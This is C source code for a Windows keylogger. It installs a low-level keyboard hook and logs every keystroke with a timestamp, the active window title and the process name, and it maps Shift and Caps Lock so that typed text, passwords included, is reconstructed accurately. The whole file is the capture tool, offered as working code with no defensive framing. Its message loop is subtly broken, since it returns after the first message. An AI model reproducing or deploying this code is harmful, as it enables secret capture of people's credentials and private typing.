#include "wchar.h"
#include "Windows.h"
#include <tchar.h>
#include <stdio.h>
#include <psapi.h>

struct KeyMap {
	int vk;
	LPCTSTR name;
};

static const KeyMap numpadMap[] = {
	{ VK_INSERT, TEXT("Numpad Insert") },
	{ VK_END, TEXT("Numpad End") },
	{ VK_DOWN, TEXT("Numpad Arrow Down") },
	{ VK_NEXT, TEXT("Numpad Page Down") },
	{ VK_LEFT, TEXT("Numpad Arrow Left") },
	{ VK_CLEAR, TEXT("Numpad Clear") },
	{ VK_RIGHT, TEXT("Numpad Arrow Right") },
	{ VK_HOME, TEXT("Numpad Home") },
	{ VK_UP, TEXT("Numpad Arrow Up") },
	{ VK_PRIOR, TEXT("Numpad Page Up") },
	{ VK_DELETE, TEXT("Numpad Delete") },
};

BOOL capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
BOOL numLockOn = (GetKeyState(VK_NUMLOCK) & 0x0001) != 0;

static HWND lastHwnd = NULL;
static TCHAR* lastWindowTitle = NULL;
static TCHAR* lastProcessName = NULL;
static TCHAR ts[20];

TCHAR* GetTimestamp(TCHAR* ts, size_t size) {
	SYSTEMTIME st;
	GetLocalTime(&st);
	_stprintf_s(ts, size, TEXT("%02d/%02d/%04d %02d:%02d:%02d"), st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, st.wSecond);
	return ts;
}

TCHAR* GetWindowTitle(HWND foreground) {
	if (lastWindowTitle) {
		free(lastWindowTitle);
		lastWindowTitle = NULL;
	}

	int lenOfWindowTitle = GetWindowTextLengthW(foreground);
	if (lenOfWindowTitle > 0) {
		lastWindowTitle = (TCHAR*)malloc((lenOfWindowTitle + 1) * sizeof(TCHAR));
		if (lastWindowTitle) {
			GetWindowTextW(foreground, lastWindowTitle, lenOfWindowTitle + 1);
		}
	}
	return lastWindowTitle;
}

TCHAR* GetActiveWindowProcess(HWND foreground) {
	if (lastProcessName) {
		free(lastProcessName);
		lastProcessName = NULL;
	}

	DWORD pid;
	GetWindowThreadProcessId(foreground, &pid);

	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	if (!hProc)
		return NULL;

	size_t size = MAX_PATH;
	while (1) {
		TCHAR* buffer = (TCHAR*)malloc(size * sizeof(TCHAR));
		if (!buffer) {
			CloseHandle(hProc);
			return NULL;
		}

		unsigned len = GetModuleFileNameExW(hProc, NULL, buffer, (DWORD)size);
		if (len == 0) {
			free(buffer);
			CloseHandle(hProc);
			return NULL;
		}

		if (len < size - 1) {
			TCHAR* lastPart = _tcsrchr(buffer, TEXT('\\'));
			if (lastPart) {
				_tcscpy_s(buffer, size, lastPart + 1);
			}
			lastProcessName = buffer;
			break;
		}
		free(buffer);
		size *= 2;
	}
	CloseHandle(hProc);
	return lastProcessName;
}


// Keyboard hook procedure
LRESULT CALLBACK _KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
		KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*)lParam;
		TCHAR key[64] = { 0 };

		GetTimestamp(ts, _countof(ts));

		HWND foreground = GetForegroundWindow();
		if (foreground != lastHwnd) {
			lastHwnd = foreground;

			lastWindowTitle = GetWindowTitle(foreground);
			lastProcessName = GetActiveWindowProcess(foreground);

			if (!lastWindowTitle)
				lastWindowTitle = _tcsdup(TEXT("No Title"));
			if (!lastProcessName)
				lastProcessName = _tcsdup(TEXT("Unknow Process"));
		}

		// Prepare for GetKeyNameText
		UINT scanCode = keyInfo->scanCode << 16;
		if (keyInfo->flags & LLKHF_EXTENDED)
			scanCode |= (1 << 24);

		// Handle special keys
		switch (keyInfo->vkCode) {
		case VK_LSHIFT:
		case VK_RSHIFT:
			_tcscpy_s(key, (keyInfo->scanCode == 0x36) ? TEXT("Right Shift") : TEXT("Shift"));
			break;

		case VK_CAPITAL:
			capsLockOn = !capsLockOn;
			_stprintf_s(key, _countof(key), TEXT("Caps Lock (%s)"), capsLockOn ? TEXT("ON") : TEXT("OFF"));
			break;

		case VK_NUMLOCK:
			numLockOn = !numLockOn;
			_stprintf_s(key, _countof(key), TEXT("Num Lock (%s)"), numLockOn ? TEXT("ON") : TEXT("OFF"));
			break;

		case VK_DECIMAL:
			_tcscpy_s(key, TEXT("Numpad ."));
			break;

		default:
			if (GetKeyNameText(scanCode, key, _countof(key)) <= 0)
				_stprintf_s(key, _countof(key), TEXT("[0x%X]"), keyInfo->vkCode);
			break;
		}

		// Handle numpad keys when Num Lock is off
		if (!numLockOn) {
			for (int i = 0; i < _countof(numpadMap); i++) {
				if (keyInfo->vkCode == numpadMap[i].vk) {
					_tcscpy_s(key, numpadMap[i].name);
					break;
				}
			}
		}

		// Handle character case
		if (_tcslen(key) == 1 && _istalpha(key[0])) {
			BOOL shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
			BOOL makeUpper = (capsLockOn ^ shiftPressed);
			key[0] = makeUpper ? _totupper(key[0]) : _totlower(key[0]);
		}
		else if (_tcslen(key) == 1 && (_istdigit(key[0]) || _istpunct(key[0]))) {
			BOOL shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
			if (shiftPressed) {
				// Map shifted characters
				switch (key[0]) {
				case '1': key[0] = '!'; break;
				case '2': key[0] = '@'; break;
				case '3': key[0] = '#'; break;
				case '4': key[0] = '$'; break;
				case '5': key[0] = '%'; break;
				case '6': key[0] = '^'; break;
				case '7': key[0] = '&'; break;
				case '8': key[0] = '*'; break;
				case '9': key[0] = '('; break;
				case '0': key[0] = ')'; break;
				case '-': key[0] = '_'; break;
				case '=': key[0] = '+'; break;
				case '[': key[0] = '{'; break;
				case ']': key[0] = '}'; break;
				case '\\': key[0] = '|'; break;
				case ';': key[0] = ':'; break;
				case '\'': key[0] = '"'; break;
				case ',': key[0] = '<'; break;
				case '.': key[0] = '>'; break;
				case '/': key[0] = '?'; break;
				case '`': key[0] = '~'; break;
				}
			}
		}

		_tprintf(TEXT("[%s] [%-*s] [%-*s]: %s\n"), ts, (int)_tcslen(lastProcessName), lastProcessName, (int)_tcslen(lastWindowTitle), lastWindowTitle, key);
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int _tmain(void*)
{
	HHOOK hHook;
	HKL hLayout;

	// Get current time logger started
	_tprintf(L"Logger started at: %s\n", GetTimestamp(ts, _countof(ts)));

	// Get current keyboard layout
	hLayout = GetKeyboardLayout(0);
	LANGID langId = LOWORD(hLayout);
	TCHAR localeName[LOCALE_NAME_MAX_LENGTH];
	LCID localeId = MAKELCID(langId, SORT_DEFAULT);

	if (LCIDToLocaleName(localeId, localeName, LOCALE_NAME_MAX_LENGTH, 0) > 0) {
		_tprintf(L"Locale: %s\n", localeName);
	}

	if (capsLockOn) {
		_tprintf(L"Caps Lock is ON\n");
	}
	else {
		_tprintf(L"Caps Lock is OFF\n");
	}

	if (numLockOn) {
		_tprintf(L"Num Lock is ON\n");
	}
	else {
		_tprintf(L"Num Lock is OFF\n");
	}

	_tprintf(L"---------------------------------------------------------------------\n");

	// Set the low-level keyboard hook
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, _KeyboardProc, GetModuleHandle(NULL), 0);
	if (!hHook) {
		_tprintf(L"Failed to install hook!\n");
		return 1;
	}

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
		return 0;
}